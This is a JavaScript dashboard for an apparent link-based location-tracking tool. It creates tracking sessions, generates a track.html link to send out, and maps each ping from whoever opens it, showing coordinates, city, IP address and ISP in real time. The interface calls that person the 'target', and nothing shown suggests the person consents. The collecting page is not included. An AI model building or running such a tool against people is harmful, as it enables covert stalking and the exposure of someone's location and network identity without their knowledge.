// ═══════════════════════════════════════════════════════════
// DASHBOARD
// ═══════════════════════════════════════════════════════════

(() => {
  'use strict';

  console.log('🚀 dashboard.js loaded');

  let db;
  let map;
  let activeSessionId = null;
  let realtimeChannel = null;
  const markerGroups = new Map();

  // ── Toast ─────────────────────────────────
  function toast(msg, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${msg}`);
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.textContent = msg;
    const container = document.getElementById('toastContainer');
    if (container) {
      container.appendChild(el);
      setTimeout(() => el.remove(), 5000);
    }
  }

  // ── Hide Loading Overlay ──────────────────
  function hideLoading() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';
  }

  // ── Show Error on Screen ──────────────────
  function showFatalError(title, details) {
    hideLoading();
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;top:0;left:0;width:100%;height:100%;
      background:rgba(15,15,26,0.97);z-index:10000;
      display:flex;align-items:center;justify-content:center;
      flex-direction:column;gap:12px;padding:40px;
      font-family:'Segoe UI',system-ui,sans-serif;
    `;
    overlay.innerHTML = `
      <div style="font-size:2.5rem">❌</div>
      <h2 style="color:#ff4757;font-size:1.3rem">${title}</h2>
      <p style="color:#8a8a9a;text-align:center;max-width:500px;line-height:1.6">${details}</p>
      <button onclick="location.reload()" style="
        margin-top:16px;padding:10px 24px;background:#00d4ff;color:#000;
        border:none;border-radius:8px;font-weight:600;cursor:pointer;
      ">🔄 Retry</button>
    `;
    document.body.appendChild(overlay);
  }

  // ── Map Init ──────────────────────────────
  function initMap() {
    try {
      map = L.map('map', {
        center: [20, 0],
        zoom: 2,
        attributionControl: false,
      });
      L.tileLayer(
        'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
        { maxZoom: 19 }
      ).addTo(map);
      console.log('✅ Map ready');
    } catch (e) {
      console.error('❌ Map failed:', e);
    }
  }

  // ── Test Connection ───────────────────────
  async function testConnection() {
    console.log('🔌 Testing Supabase...');

    try {
      const { data, error } = await db
        .from('sessions')
        .select('id')
        .limit(1);

      if (error) {
        console.error('❌ Connection error:', error);

        if (error.message?.includes('does not exist')) {
          showFatalError(
            'Tables Not Found',
            'The "sessions" table does not exist in your Supabase database.<br><br>' +
            'Go to <strong>Supabase → SQL Editor</strong> and run the table creation SQL.'
          );
        } else if (error.code === '42501' || error.message?.includes('policy')) {
          showFatalError(
            'Permission Denied',
            'Row Level Security policies are missing.<br><br>' +
            'Go to <strong>Supabase → SQL Editor</strong> and run the full SQL including the CREATE POLICY statements.'
          );
        } else {
          showFatalError(
            'Database Error',
            `${error.message}<br><br>Code: ${error.code || 'unknown'}`
          );
        }
        return false;
      }

      console.log('✅ Supabase connected! Found', data?.length || 0, 'sessions');
      return true;
    } catch (e) {
      console.error('❌ Network error:', e);
      showFatalError(
        'Cannot Reach Supabase',
        'Check your SUPABASE_URL in config.js and your internet connection.'
      );
      return false;
    }
  }

  // ── Load Sessions ─────────────────────────
  async function loadSessions() {
    const { data: sessions, error } = await db
      .from('sessions')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('❌ Load sessions:', error);
      return;
    }

    const enriched = await Promise.all(
      sessions.map(async (s) => {
        const { count } = await db
          .from('locations')
          .select('*', { count: 'exact', head: true })
          .eq('session_id', s.id);

        const { data: latest } = await db
          .from('locations')
          .select('created_at')
          .eq('session_id', s.id)
          .order('created_at', { ascending: false })
          .limit(1);

        return {
          ...s,
          ping_count: count || 0,
          last_seen: latest?.[0]?.created_at || null,
        };
      })
    );

    renderSessions(enriched);
  }

  // ── Render Sessions ───────────────────────
  function renderSessions(sessions) {
    const el = document.getElementById('sessionsList');

    if (!sessions.length) {
      el.innerHTML = `
        <div class="empty-state">
          <div class="icon">📭</div>
          <p>No sessions yet.<br>Create one to start tracking.</p>
        </div>`;
      return;
    }

    el.innerHTML = sessions
      .map(
        (s) => `
        <div class="session-card ${s.id === activeSessionId ? 'active' : ''}"
             data-id="${s.id}" onclick="window._select('${s.id}')">
          <div class="name">
            <span class="status-dot ${s.is_active ? 'active' : 'inactive'}"></span>
            ${escHtml(s.name)}
          </div>
          <div class="meta">
            <span>🏓 ${s.ping_count} pings</span>
            <span>👁 ${s.last_seen ? timeAgo(s.last_seen) : 'Never'}</span>
          </div>
        </div>`
      )
      .join('');
  }

  // ── Create Session ────────────────────────
  async function createSession(name) {
    const id = generateId();
    console.log(`➕ Creating: "${name}" (${id})`);

    const { data, error } = await db
      .from('sessions')
      .insert({ id, name })
      .select();

    if (error) {
      console.error('❌ Create failed:', error);
      toast('❌ Failed: ' + error.message, 'error');
      return;
    }

    console.log('✅ Created:', data);
    toast(`✅ Session "${name}" created!`, 'success');
    await loadSessions();
    selectSession(id);
  }

  // ── Select Session ────────────────────────
  async function selectSession(id) {
    console.log('🔍 Selecting:', id);
    activeSessionId = id;

    if (realtimeChannel) {
      db.removeChannel(realtimeChannel);
      realtimeChannel = null;
    }

    const { data: session } = await db
      .from('sessions')
      .select('*')
      .eq('id', id)
      .single();

    if (!session) {
      toast('Session not found', 'error');
      return;
    }

    const { data: locations } = await db
      .from('locations')
      .select('*')
      .eq('session_id', id)
      .order('created_at', { ascending: false })
      .limit(200);

    // Panel
    const panel = document.getElementById('infoPanel');
    document.getElementById('panelTitle').innerHTML = `
      ${escHtml(session.name)}
      ${session.is_active
        ? '<span class="live-badge"><span class="pulse"></span>LIVE</span>'
        : '<span class="badge" style="background:var(--text-muted);color:#000">PAUSED</span>'}
    `;

    // Build tracking URL - handle GitHub Pages subpath
    const currentUrl = new URL(window.location.href);
    const basePath = currentUrl.pathname.replace(/\/[^/]*$/, '');
    document.getElementById('trackingUrl').value =
      `${currentUrl.origin}${basePath}/track.html?s=${id}`;

    document.getElementById('toggleBtn').textContent =
      session.is_active ? '⏸ Pause' : '▶ Resume';

    panel.classList.add('visible');
    renderLocations(locations || []);
    updateMap(id, locations || []);

    document.querySelectorAll('.session-card').forEach((c) =>
      c.classList.toggle('active', c.dataset.id === id)
    );

    // Realtime
    realtimeChannel = db
      .channel(`loc-${id}`)
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'locations',
          filter: `session_id=eq.${id}`,
        },
        () => {
          toast('📍 New location ping!', 'success');
          selectSession(id);
        }
      )
      .subscribe((status) => {
        console.log('📡 Realtime:', status);
      });
  }

  // ── Render Locations ──────────────────────
  function renderLocations(locations) {
    const el = document.getElementById('locationHistory');

    if (!locations.length) {
      el.innerHTML = `
        <h4>📍 Location History</h4>
        <div class="empty-state">
          <p>Waiting for target to open the tracking link…</p>
        </div>`;
      return;
    }

    el.innerHTML = `
      <h4>📍 Location History (${locations.length})</h4>
      ${locations
        .map(
          (loc, i) => `
        <div class="location-entry">
          <div class="coords">
            ${loc.latitude?.toFixed(6) ?? '?'}, ${loc.longitude?.toFixed(6) ?? '?'}
            ${i === 0 ? '<span class="live-badge" style="margin-left:8px"><span class="pulse"></span>Latest</span>' : ''}
          </div>
          <div class="details">
            📍 ${escHtml(loc.city)}, ${escHtml(loc.region)}, ${escHtml(loc.country)}<br>
            🌐 IP: <code>${escHtml(loc.ip)}</code><br>
            🏢 ISP: ${escHtml(loc.isp)}<br>
            🎯 Accuracy: ${escHtml(loc.accuracy)}
          </div>
          <div class="time">${new Date(loc.created_at).toLocaleString()}</div>
        </div>`
        )
        .join('')}
    `;
  }

  // ── Update Map ────────────────────────────
  function updateMap(sessionId, locations) {
    if (markerGroups.has(sessionId)) {
      map.removeLayer(markerGroups.get(sessionId));
    }

    const valid = locations.filter((l) => l.latitude && l.longitude);
    if (!valid.length) return;

    const group = L.layerGroup();

    if (valid.length > 1) {
      L.polyline(
        valid.map((l) => [l.latitude, l.longitude]),
        { color: '#00d4ff', weight: 2, opacity: 0.5, dashArray: '5,10' }
      ).addTo(group);
    }

    valid.forEach((loc, i) => {
      const isLatest = i === 0;
      const icon = L.divIcon({
        className: 'custom-marker',
        html: `<div class="marker-ping ${isLatest ? 'latest' : ''}"
                    style="opacity:${isLatest ? 1 : 0.4};
                           width:${isLatest ? 22 : 10}px;
                           height:${isLatest ? 22 : 10}px"></div>`,
        iconSize: [22, 22],
        iconAnchor: [11, 11],
      });

      L.marker([loc.latitude, loc.longitude], { icon })
        .bindPopup(
          `<div style="font-size:13px;line-height:1.6">
            <strong>${escHtml(loc.city)}, ${escHtml(loc.country)}</strong><br>
            IP: <code>${escHtml(loc.ip)}</code><br>
            ISP: ${escHtml(loc.isp)}<br>
            Accuracy: ${escHtml(loc.accuracy)}<br>
            Time: ${new Date(loc.created_at).toLocaleString()}
          </div>`
        )
        .addTo(group);
    });

    group.addTo(map);
    markerGroups.set(sessionId, group);
    map.flyTo([valid[0].latitude, valid[0].longitude], 13, { duration: 1.5 });
  }

  // ── Toggle ────────────────────────────────
  async function toggleSession() {
    if (!activeSessionId) return;
    const { data: s } = await db
      .from('sessions')
      .select('is_active')
      .eq('id', activeSessionId)
      .single();

    await db
      .from('sessions')
      .update({ is_active: !s.is_active })
      .eq('id', activeSessionId);

    toast(s.is_active ? '⏸ Paused' : '▶ Resumed', 'info');
    await loadSessions();
    selectSession(activeSessionId);
  }

  // ── Delete ────────────────────────────────
  async function deleteSession() {
    if (!activeSessionId) return;
    if (!confirm('Delete this session and all data?')) return;

    const id = activeSessionId;
    if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
    if (markerGroups.has(id)) { map.removeLayer(markerGroups.get(id)); markerGroups.delete(id); }

    await db.from('locations').delete().eq('session_id', id);
    await db.from('sessions').delete().eq('id', id);

    activeSessionId = null;
    document.getElementById('infoPanel').classList.remove('visible');
    toast('🗑 Deleted', 'error');
    await loadSessions();
  }

  // ── Globals ───────────────────────────────
  window._select = selectSession;

  // ── INIT ──────────────────────────────────
  document.addEventListener('DOMContentLoaded', async () => {
    console.log('🚀 Initializing dashboard...');

    // 1. Init Supabase
    try {
      db = getSupabase();
    } catch (e) {
      showFatalError('Supabase Init Failed', e.message);
      return;
    }

    // 2. Init Map
    initMap();

    // 3. Test connection
    const ok = await testConnection();
    if (!ok) return;

    // 4. Hide loading overlay
    hideLoading();

    // 5. Load sessions
    await loadSessions();
    console.log('✅ Dashboard ready!');

    // ── Event Listeners ─────────────────────

    document.getElementById('createForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const input = document.getElementById('sessionName');
      const name = input.value.trim();
      if (!name) { toast('Enter a name first', 'error'); return; }
      await createSession(name);
      input.value = '';
    });

    document.getElementById('closePanel').addEventListener('click', () => {
      document.getElementById('infoPanel').classList.remove('visible');
      activeSessionId = null;
      if (realtimeChannel) { db.removeChannel(realtimeChannel); realtimeChannel = null; }
      document.querySelectorAll('.session-card').forEach((c) => c.classList.remove('active'));
    });

    document.getElementById('copyUrlBtn').addEventListener('click', () => {
      const input = document.getElementById('trackingUrl');
      navigator.clipboard.writeText(input.value)
        .then(() => toast('📋 Copied!', 'success'))
        .catch(() => { input.select(); document.execCommand('copy'); toast('📋 Copied!', 'success'); });
    });

    document.getElementById('toggleBtn').addEventListener('click', toggleSession);
    document.getElementById('deleteBtn').addEventListener('click', deleteSession);

    setInterval(loadSessions, 30000);
  });
})();
